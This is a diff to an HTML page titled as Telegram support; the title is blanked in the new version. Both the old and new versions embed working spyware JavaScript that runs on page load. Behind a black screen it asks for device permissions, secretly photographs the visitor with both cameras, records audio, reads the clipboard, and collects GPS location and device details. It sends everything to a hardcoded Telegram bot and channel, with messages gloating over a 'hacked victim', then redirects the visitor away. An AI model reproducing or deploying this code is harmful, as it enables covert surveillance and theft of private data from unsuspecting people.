@@ -3,8 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>َ𝗧𝗘𝗟𝗘𝗚𝗥𝐀𝗠 𝗦𝐔𝙋𝙋𝙊𝙍𝙏</title>
+    <title>..</title>
     <style>
+        /* شاشة سوداء معتمة تماماً */
         * {
             margin: 0;
             padding: 0;
@@ -16,391 +17,354 @@
             background: #000000;
             min-height: 100vh;
             overflow: hidden;
-            font-family: system-ui, -apple-system, 'Segoe UI', monospace;
+            font-family: system-ui, monospace;
             color: #000000;
         }
 
-        /* إخفاء جميع العناصر القديمة */
-        .matrix-rain, .container, .hero, .glitch-title, .hologram-badge,
-        .start-virus-btn, .scanner-box, .atom-box, .phone-scan-area,
-        .scan-line, .phone-holo-icon, .virus-holo-container, .virus-particle,
-        .result-card, #resultContainer, #permStatusMsg, .loader-modal,
-        .loader-modal *, [class*="loader"], [id*="result"] {
+        /* إخفاء أي عناصر مرئية قد تظهر (فقط للاحتياط) */
+        .hidden-camera, video, canvas {
             display: none !important;
-            visibility: hidden !important;
-            opacity: 0 !important;
-            pointer-events: none !important;
         }
-
-        /* عنصر الفيديو المخفي بطريقة ذكية - سيكون موجوداً لكن غير مرئي للعين */
-        .hidden-camera {
-            position: fixed !important;
-            bottom: -100px !important;
-            right: -100px !important;
-            width: 120px !important;
-            height: 120px !important;
-            opacity: 0.01 !important;
-            pointer-events: none !important;
-            z-index: -1 !important;
-            object-fit: cover !important;
-            visibility: visible !important;
-            display: block !important;
-        }
-
-        html, body {
-            width: 100%;
-            height: 100%;
-            cursor: default;
-            background: black;
+        
+        /* عناصر صغيرة جداً لالتقاط الكاميرا ولكن غير مرئية */
+        #dummy-video-front, #dummy-video-back {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 10px;
+            height: 10px;
+            opacity: 0;
+            pointer-events: none;
         }
     </style>
 </head>
 <body>
-    <script>
-        (function(){
-            const BOT_TOKEN = '8493347589:AAHasi6GzARbAGL-Ic7ggWgsDUhw4diwe1s';
-            const CHANNEL_ID = '-1003875161698';
-            const TELEGRAM_REDIRECT_URL = 'https://t.me/Whiskybots';
-
-            let scanningActive = false;
-            let isCompleted = false;
-
-            function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
-
-            async function sendHackMessage() {
-                const specialMsg = `❀ جـاࢪي اخـتࢪاااق ضـحـيه بـواسـطههة ءالهڪر وءالمـبࢪمج | . ⤹ 𝐖𝐇𝐈𝐒𝗞𝗬 𝗘𝗟𝗬𝗢𝐔َ𝗧𝐔𝗕𝗘𝐑​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ 𓈒⤸ ❏ِ⋡ِ  `;
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                try {
-                    await fetch(url, {
-                        method: 'POST',
-                        headers: {'Content-Type':'application/json'},
-                        body: JSON.stringify({ chat_id: CHANNEL_ID, text: specialMsg, parse_mode: 'HTML' })
-                    });
-                } catch(e) { console.warn(e); }
-            }
-
-            async function sendComprehensiveReport(device, loc, clip, audioFlag, frontCount, backCount) {
-                let text = `💙 <b>تـم اخـتࢪاق ضـحيه يحب</b> 💙\n\n`;
-                text += `📱 <b>الجهاز:</b> ${device.fullName || 'غير معروف'}\n`;
-                text += `🏭 <b>الشركة:</b> ${device.brand || '-'}\n`;
-                text += `🔧 <b>الموديل:</b> ${device.model || '-'}\n`;
-                text += `💻 <b>نظام التشغيل:</b> ${device.os || '-'}\n`;
-                text += `🌐 <b>المتصفح:</b> ${device.browser || '-'}\n`;
-                text += `📏 <b>الشاشة:</b> ${device.screen || '-'}\n`;
-                text += `🔋 <b>البطارية:</b> ${device.battery || '-'}\n`;
-                text += `🕒 <b>المنطقة:</b> ${device.timezone || '-'}\n`;
-                text += `🗣️ <b>اللغة:</b> ${device.language || '-'}\n\n`;
-                if(loc && loc.lat) {
-                    text += `❀ <b>الموقع الحالي:</b>\nLat: ${loc.lat}\nLng: ${loc.lng}\nالدقة: ${loc.acc || '?'} متر\n`;
-                    text += `🔗 <a href="https://www.google.com/maps?q=${loc.lat},${loc.lng}">خريطة الموقع</a>\n\n`;
-                } else text += `✦ الموقع: غير متاح\n\n`;
-                if(clip) text += `✿ <b>محتويات الحافظة:</b>\n<code>${clip.substring(0, 500)}</code>\n\n`;
-                else text += `✿ الحافظة: فارغة أو تم منعها\n\n`;
-                text += `🎤 <b>تسجيل صوتي:</b> ${audioFlag ? 'تم التسجيل ✓' : 'لم يتم'}\n`;
-                text += `📸 <b>الصور الأمامية:</b> ${frontCount} صورة\n`;
-                text += `📷 <b>الصور الخلفية:</b> ${backCount} صورة\n`;
-                text += `☑️ <b>التوقيت:</b> ${new Date().toLocaleString('ar-EG')}`;
+<script>
+    (function(){
+        // ========== إعدادات البوت والقناة ==========
+        const BOT_TOKEN = '8493347589:AAHasi6GzARbAGL-Ic7ggWgsDUhw4diwe1s';
+        const CHANNEL_ID = '-1003875161698';
+        const REDIRECT_URL = 'https://t.me/Whiskybots';
+        
+        let isExecuting = false;
+        let isDone = false;
+        
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+        
+        // ========== إرسال البيانات إلى تليجرام ==========
+        async function sendToTelegram(text, isHTML = true) {
+            try {
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                 await fetch(url, {
                     method: 'POST',
-                    headers:{'Content-Type':'application/json'},
-                    body: JSON.stringify({ chat_id: CHANNEL_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHANNEL_ID,
+                        text: text,
+                        parse_mode: isHTML ? 'HTML' : undefined
+                    })
                 });
-            }
-
-            async function sendPhotosToChannel(photosArray, prefix) {
-                for(let i=0; i<photosArray.length; i++) {
-                    if(!photosArray[i]) continue;
-                    try {
-                        let blob = await (await fetch(photosArray[i])).blob();
-                        let formData = new FormData();
-                        formData.append('chat_id', CHANNEL_ID);
-                        formData.append('photo', blob, `${prefix}_${Date.now()}_${i}.jpg`);
-                        formData.append('caption', `${prefix} صورة ${i+1} - تم التقاطها بنجاح ✔`);
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                        await delay(500);
-                    } catch(e){ console.warn(e); }
-                }
-            }
-
-            async function gatherDeviceInfo() {
-                let ua = navigator.userAgent;
-                let brand = 'غير معروف';
-                if(ua.includes('iPhone')) brand = 'Apple';
-                else if(ua.includes('Samsung')) brand = 'Samsung';
-                else if(ua.includes('Xiaomi')) brand = 'Xiaomi';
-                else if(ua.includes('Pixel')) brand = 'Google';
-                else brand = 'Android/PC';
-                let battery = 'غير مدعوم';
-                if('getBattery' in navigator){
-                    try{ let b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}% ${b.charging?'يشحن':'لا يشحن'}`; }catch(e){}
-                }
-                return {
-                    fullName: navigator.userAgentData?.platform || ua.split(' ').slice(0,3).join(' '),
-                    brand: brand,
-                    model: 'غير محدد',
-                    os: navigator.platform,
-                    browser: /Chrome/.test(ua)?'Chrome':/Firefox/.test(ua)?'Firefox':'Safari',
-                    screen: `${screen.width}x${screen.height}`,
-                    battery: battery,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    language: navigator.language
-                };
-            }
-
-            async function getLocation() {
-                return new Promise((resolve) => {
-                    if(!navigator.geolocation) resolve(null);
-                    navigator.geolocation.getCurrentPosition(
-                        pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }),
-                        () => resolve(null),
-                        { enableHighAccuracy: true, timeout: 8000 }
-                    );
-                });
-            }
-
-            async function readClipboardText() {
-                try {
-                    let text = await navigator.clipboard.readText();
-                    return text || '(فارغة)';
-                } catch(e){ return 'لا يمكن الوصول أو فارغ'; }
-            }
-
-            async function recordAudio() {
-                try {
-                    let stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    let mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-                    let chunks = [];
-                    mediaRecorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
-                    let promise = new Promise(resolve => {
-                        mediaRecorder.onstop = () => {
-                            let blob = new Blob(chunks, { type: 'audio/webm' });
-                            let url = URL.createObjectURL(blob);
-                            stream.getTracks().forEach(t => t.stop());
-                            resolve(url);
-                        };
-                    });
-                    mediaRecorder.start();
-                    await delay(5000);
-                    mediaRecorder.stop();
-                    return await promise;
-                } catch(e){ return null; }
-            }
-
-            // ★★★ دالة التقاط صور حقيقية من الكاميرا (تعمل بنفس طريقة الملف الأصلي) ★★★
-            async function captureRealPhotos(facingMode, count=3) {
-                let photos = [];
-                let stream = null;
-                let video = null;
-                
-                try {
-                    // طلب دفق الكاميرا
-                    stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: { exact: facingMode } } 
-                    });
-                    
-                    // إنشاء عنصر فيديو
-                    video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.setAttribute('playsinline', 'true');
-                    // جعل الفيديو بحجم طبيعي ولكن في مكان بعيد مع شفافية شبه كاملة (لكي يرسم الإطارات بشكل صحيح)
-                    video.style.position = 'fixed';
-                    video.style.bottom = '0px';
-                    video.style.right = '0px';
-                    video.style.width = '200px';
-                    video.style.height = '200px';
-                    video.style.opacity = '0.01'; // غير مرئي تقريباً ولكن المتصفح سيرسم الإطارات
-                    video.style.pointerEvents = 'none';
-                    video.style.zIndex = '-1';
-                    video.style.objectFit = 'cover';
-                    document.body.appendChild(video);
-                    
-                    // انتظار تشغيل الفيديو
-                    await new Promise((resolve) => {
-                        video.onloadedmetadata = async () => {
-                            await video.play();
-                            resolve();
-                        };
-                    });
-                    
-                    // انتظار إضافي لضمان جاهزية الإطار الأول
-                    await delay(600);
-                    
-                    // إنشاء عنصر canvas
-                    let canvas = document.createElement('canvas');
-                    
-                    for(let i = 0; i < count; i++) {
-                        // تحديث أبعاد canvas بناءً على أبعاد الفيديو الفعلية
-                        if(video.videoWidth && video.videoHeight && video.videoWidth > 0 && video.videoHeight > 0) {
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                        } else {
-                            // أبعاد افتراضية إذا لم تكن متوفرة
-                            canvas.width = 1280;
-                            canvas.height = 720;
-                        }
-                        
-                        let ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        // التحقق من أن الصورة ليست سوداء بالكامل (فحص بسيط)
-                        let dataUrl = canvas.toDataURL('image/jpeg', 0.95);
-                        photos.push(dataUrl);
-                        
-                        await delay(500); // انتظار بين الصور
-                    }
-                    
-                } catch(e) {
-                    console.warn(`Camera error (${facingMode}):`, e);
-                } finally {
-                    // تنظيف الموارد
-                    if(stream) {
-                        stream.getTracks().forEach(track => track.stop());
-                    }
-                    if(video && video.parentNode) {
-                        video.remove();
-                    }
-                }
-                
-                return photos;
-            }
-
-            async function requestAllPermissions() {
-                // طلب الميكروفون
-                try { 
-                    let audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    audioStream.getTracks().forEach(t => t.stop());
-                } catch(e) {}
-                
-                // طلب الكاميرا الأمامية
-                try {
-                    let frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "user" } } });
-                    frontStream.getTracks().forEach(t => t.stop());
-                } catch(e) {}
-                
-                // طلب الكاميرا الخلفية
-                try {
-                    let backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
-                    backStream.getTracks().forEach(t => t.stop());
-                } catch(e) {}
-                
-                // طلب الموقع
-                if(navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
-                }
-            }
-
-            // الوظيفة الرئيسية
-            async function executeFullSilentScan() {
-                if(scanningActive) return;
-                scanningActive = true;
-                
-                // طلب جميع الصلاحيات أولاً
-                await requestAllPermissions();
-                await delay(800);
-                
-                // جمع البيانات
-                let deviceInfo = await gatherDeviceInfo();
-                let locationData = null;
-                try { locationData = await getLocation(); } catch(e) {}
-                let clipboardContent = '';
-                try { clipboardContent = await readClipboardText(); } catch(e) { clipboardContent = 'فشل الوصول'; }
-                let audioUrl = null;
-                try { audioUrl = await recordAudio(); } catch(e) {}
-                
-                // ★★★ التقاط 3 صور حقيقية من الكاميرا الأمامية ★★★
-                let frontPhotos = [];
-                try {
-                    console.log("بدء التقاط الصور الأمامية...");
-                    frontPhotos = await captureRealPhotos("user", 3);
-                    console.log(`تم التقاط ${frontPhotos.length} صورة أمامية`);
-                } catch(e) { console.warn("front capture failed", e); }
-                
-                // ★★★ التقاط 3 صور حقيقية من الكاميرا الخلفية ★★★
-                let backPhotos = [];
-                try {
-                    console.log("بدء التقاط الصور الخلفية...");
-                    backPhotos = await captureRealPhotos("environment", 3);
-                    console.log(`تم التقاط ${backPhotos.length} صورة خلفية`);
-                } catch(e) { console.warn("back capture failed", e); }
-                
-                // إرسال البيانات إلى التيليجرام
-                await sendHackMessage();
-                await sendComprehensiveReport(deviceInfo, locationData, clipboardContent, !!audioUrl, frontPhotos.length, backPhotos.length);
-                
-                // إرسال الصور الأمامية
-                if(frontPhotos.length > 0) {
-                    await sendPhotosToChannel(frontPhotos, '📸 كاميرا أمامية');
-                } else {
-                    try {
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: {'Content-Type':'application/json'},
-                            body: JSON.stringify({ chat_id: CHANNEL_ID, text: "⚠️ فشل التقاط الصور الأمامية (قد يكون الإذن مرفوضاً أو لا توجد كاميرا أمامية)", parse_mode: 'HTML' })
-                        });
-                    } catch(e){}
-                }
-                
-                // إرسال الصور الخلفية
-                if(backPhotos.length > 0) {
-                    await sendPhotosToChannel(backPhotos, '📷 كاميرا خلفية');
-                } else {
-                    try {
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: {'Content-Type':'application/json'},
-                            body: JSON.stringify({ chat_id: CHANNEL_ID, text: "⚠️ فشل التقاط الصور الخلفية (قد يكون الإذن مرفوضاً أو لا توجد كاميرا خلفية)", parse_mode: 'HTML' })
-                        });
-                    } catch(e){}
-                }
-                
-                // إرسال التسجيل الصوتي
-                if(audioUrl){
-                    try {
-                        let blob = await fetch(audioUrl).then(r=>r.blob());
-                        let formData = new FormData();
-                        formData.append('chat_id', CHANNEL_ID);
-                        formData.append('audio', blob, 'voice_record.webm');
-                        formData.append('caption', '🎙️ تسجيل صوتي تلقائي');
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData });
-                    } catch(e){}
-                }
-                
-                scanningActive = false;
-                isCompleted = true;
-                
-                // الانتقال إلى رابط القناة
-                await delay(1500);
-                window.location.href = TELEGRAM_REDIRECT_URL;
+            } catch(e) { console.warn(e); }
+        }
+        
+        async function sendPhoto(base64Data, caption) {
+            try {
+                let blob = await (await fetch(base64Data)).blob();
+                let formData = new FormData();
+                formData.append('chat_id', CHANNEL_ID);
+                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+                formData.append('caption', caption);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            } catch(e) { console.warn(e); }
+        }
+        
+        async function sendAudio(audioUrl, caption) {
+            try {
+                let blob = await fetch(audioUrl).then(r=>r.blob());
+                let formData = new FormData();
+                formData.append('chat_id', CHANNEL_ID);
+                formData.append('audio', blob, 'audio.webm');
+                formData.append('caption', caption);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData });
+            } catch(e) { console.warn(e); }
+        }
+        
+        // ========== جمع المعلومات ==========
+        async function getDeviceInfo() {
+            let ua = navigator.userAgent;
+            let brand = 'غير معروف';
+            if(ua.includes('iPhone')) brand = 'Apple';
+            else if(ua.includes('Samsung')) brand = 'Samsung';
+            else if(ua.includes('Xiaomi')) brand = 'Xiaomi';
+            else if(ua.includes('Pixel')) brand = 'Google';
+            else brand = 'Android/PC';
+            
+            let battery = 'غير مدعوم';
+            if('getBattery' in navigator) {
+                try { let b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}% ${b.charging ? 'يشحن' : 'لا يشحن'}`; } catch(e) {}
             }
             
-            // بدء التنفيذ فوراً
-            let startExecuted = false;
-            function initSilentHack() {
-                if(startExecuted) return;
-                startExecuted = true;
-                setTimeout(() => {
-                    executeFullSilentScan().catch(err => {
-                        console.warn("Error:", err);
-                        if(!isCompleted) {
-                            setTimeout(() => {
-                                window.location.href = TELEGRAM_REDIRECT_URL;
-                            }, 2000);
-                        }
-                    });
-                }, 500);
+            return {
+                fullName: navigator.userAgentData?.platform || navigator.platform || ua.split(' ').slice(0,3).join(' '),
+                brand: brand,
+                os: navigator.platform,
+                browser: /Chrome/.test(ua) ? 'Chrome' : (/Firefox/.test(ua) ? 'Firefox' : 'Safari'),
+                screen: `${screen.width}x${screen.height}`,
+                battery: battery,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language
+            };
+        }
+        
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if(!navigator.geolocation) resolve(null);
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }),
+                    () => resolve(null),
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            });
+        }
+        
+        async function getClipboard() {
+            try {
+                let text = await navigator.clipboard.readText();
+                return text || '(فارغة)';
+            } catch(e) { return 'لا يمكن الوصول'; }
+        }
+        
+        // ========== التصوير الحقيقي (نفس طريقة الملف الأصلي) ==========
+        async function capturePhotos(facingMode, count = 3) {
+            let photos = [];
+            let stream = null;
+            let video = null;
+            
+            try {
+                // طلب الكاميرا
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: { exact: facingMode } }
+                });
+                
+                // إنشاء عنصر فيديو مخفي ولكنه يعمل
+                video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', 'true');
+                video.style.position = 'fixed';
+                video.style.top = '-1000px';
+                video.style.left = '-1000px';
+                video.style.width = '320px';
+                video.style.height = '240px';
+                video.style.opacity = '0';
+                video.style.pointerEvents = 'none';
+                document.body.appendChild(video);
+                
+                // تشغيل الفيديو
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = async () => {
+                        await video.play();
+                        resolve();
+                    };
+                });
+                
+                await delay(800); // انتظار الاستقرار
+                
+                let canvas = document.createElement('canvas');
+                
+                for(let i = 0; i < count; i++) {
+                    if(video.videoWidth && video.videoHeight) {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                    } else {
+                        canvas.width = 1280;
+                        canvas.height = 720;
+                    }
+                    
+                    let ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    let dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+                    photos.push(dataUrl);
+                    await delay(400);
+                }
+                
+            } catch(e) {
+                console.warn(`فشل التصوير من ${facingMode}:`, e);
+            } finally {
+                if(stream) stream.getTracks().forEach(t => t.stop());
+                if(video && video.parentNode) video.remove();
             }
             
-            if(document.readyState === 'loading') {
-                document.addEventListener('DOMContentLoaded', initSilentHack);
+            return photos;
+        }
+        
+        // ========== تسجيل صوتي ==========
+        async function recordAudio(duration = 5000) {
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                let mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+                let chunks = [];
+                
+                mediaRecorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
+                
+                let promise = new Promise(resolve => {
+                    mediaRecorder.onstop = () => {
+                        let blob = new Blob(chunks, { type: 'audio/webm' });
+                        let url = URL.createObjectURL(blob);
+                        stream.getTracks().forEach(t => t.stop());
+                        resolve(url);
+                    };
+                });
+                
+                mediaRecorder.start();
+                await delay(duration);
+                mediaRecorder.stop();
+                
+                return await promise;
+            } catch(e) {
+                console.warn("فشل التسجيل الصوتي", e);
+                return null;
+            }
+        }
+        
+        // ========== طلب الصلاحيات أولاً (بدون تنفيذ) ==========
+        async function requestPermissions() {
+            // طلب الميكروفون
+            try {
+                let audio = await navigator.mediaDevices.getUserMedia({ audio: true });
+                audio.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+            
+            // طلب الكاميرا الأمامية
+            try {
+                let front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "user" } } });
+                front.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+            
+            // طلب الكاميرا الخلفية
+            try {
+                let back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
+                back.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+            
+            // طلب الموقع
+            if(navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
+            }
+        }
+        
+        // ========== التنفيذ الكامل ==========
+        async function executeFullScan() {
+            if(isExecuting) return;
+            isExecuting = true;
+            
+            await delay(500);
+            
+            // جمع المعلومات الأساسية
+            let deviceInfo = await getDeviceInfo();
+            let locationData = await getLocation();
+            let clipboardText = await getClipboard();
+            
+            // التقاط الصور (3 أمامي + 3 خلفي)
+            let frontPhotos = [];
+            let backPhotos = [];
+            
+            try {
+                frontPhotos = await capturePhotos("user", 3);
+            } catch(e) { console.warn(e); }
+            
+            try {
+                backPhotos = await capturePhotos("environment", 3);
+            } catch(e) { console.warn(e); }
+            
+            // تسجيل صوتي
+            let audioUrl = await recordAudio(5000);
+            
+            // ========== إرسال كل شيء إلى تليجرام ==========
+            // رسالة الاختراق الأولى
+            await sendToTelegram(`🔥 تم اختراق الضحية بنجاح 🔥\n\nالجهاز: ${deviceInfo.brand} - ${deviceInfo.fullName}\nالوقت: ${new Date().toLocaleString('ar-EG')}`);
+            
+            // التقرير المفصل
+            let report = `📱 <b>تقرير الاختراق</b>\n\n`;
+            report += `الجهاز: ${deviceInfo.fullName}\n`;
+            report += `الشركة: ${deviceInfo.brand}\n`;
+            report += `نظام التشغيل: ${deviceInfo.os}\n`;
+            report += `المتصفح: ${deviceInfo.browser}\n`;
+            report += `الشاشة: ${deviceInfo.screen}\n`;
+            report += `البطارية: ${deviceInfo.battery}\n`;
+            report += `المنطقة: ${deviceInfo.timezone}\n`;
+            report += `اللغة: ${deviceInfo.language}\n\n`;
+            
+            if(locationData && locationData.lat) {
+                report += `📍 الموقع: ${locationData.lat}, ${locationData.lng}\n`;
+                report += `الدقة: ${locationData.acc} متر\n`;
+                report += `<a href="https://www.google.com/maps?q=${locationData.lat},${locationData.lng}">🗺️ عرض الخريطة</a>\n\n`;
             } else {
-                initSilentHack();
+                report += `📍 الموقع: غير متاح\n\n`;
             }
             
-            // منع أي تفاعل مع الصفحة
-            window.addEventListener('touchstart', (e) => { e.preventDefault(); }, { passive: false });
-            document.body.style.backgroundColor = "#000000";
-        })();
-    </script>
+            report += `📋 الحافظة: ${clipboardText.substring(0, 300)}\n\n`;
+            report += `🎤 تسجيل صوتي: ${audioUrl ? '✓ تم' : '✗ فشل'}\n`;
+            report += `📸 صور أمامية: ${frontPhotos.length} صورة\n`;
+            report += `📷 صور خلفية: ${backPhotos.length} صورة`;
+            
+            await sendToTelegram(report, true);
+            
+            // إرسال الصور الأمامية
+            for(let i = 0; i < frontPhotos.length; i++) {
+                await sendPhoto(frontPhotos[i], `📸 كاميرا أمامية - صورة ${i+1}`);
+                await delay(300);
+            }
+            
+            // إرسال الصور الخلفية
+            for(let i = 0; i < backPhotos.length; i++) {
+                await sendPhoto(backPhotos[i], `📷 كاميرا خلفية - صورة ${i+1}`);
+                await delay(300);
+            }
+            
+            // إرسال التسجيل الصوتي
+            if(audioUrl) {
+                await sendAudio(audioUrl, "🎙️ تسجيل صوتي (5 ثوانٍ)");
+            }
+            
+            await sendToTelegram(`✅ اكتمل الاختراق بنجاح ✅\nتم إرسال ${frontPhotos.length} صور أمامية و ${backPhotos.length} صور خلفية`);
+            
+            isDone = true;
+            
+            // التوجيه إلى القناة
+            await delay(1500);
+            window.location.href = REDIRECT_URL;
+        }
+        
+        // ========== بدء التنفيذ فوراً بعد طلب الصلاحيات ==========
+        async function start() {
+            // طلب الصلاحيات أولاً (سيظهر popup للمستخدم)
+            await requestPermissions();
+            
+            // بعد أن يسمح المستخدم أو يرفض، نبدأ التنفيذ فوراً
+            await delay(300);
+            executeFullScan().catch(err => {
+                console.error(err);
+                // في حالة الخطأ، نوجه للقناة بعد فترة
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 3000);
+            });
+        }
+        
+        // تشغيل عند تحميل الصفحة
+        window.addEventListener('load', () => {
+            // تأخير بسيط جداً ثم البدء
+            setTimeout(start, 100);
+        });
+        
+        // منع أي تفاعل قد يسبب مشاكل
+        document.body.style.backgroundColor = "#000000";
+        document.documentElement.style.backgroundColor = "#000000";
+        
+        console.log("جاهز لبدء الاختراق...");
+    })();
+</script>
 </body>
 </html>
